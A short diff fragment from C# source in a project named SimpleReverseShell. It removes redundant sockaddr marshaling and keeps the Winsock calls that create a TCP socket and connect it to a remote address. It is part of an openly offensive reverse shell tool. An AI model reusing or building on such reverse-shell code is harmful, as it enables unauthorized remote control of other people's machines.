@@ -290,13 +290,9 @@ namespace SimpleReverseShell
       var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
       Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);
 
-      var sockAddr = Marshal.PtrToStructure<sockaddr>(sockAddrInPtr);
-
       var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
       PrintLastError(nameof(WSASocketA));
 
-      var addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddr));
-      Marshal.StructureToPtr(sockAddr, addrPointer, false);
       var connectSuccess = connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
       PrintLastError(nameof(connect));
 
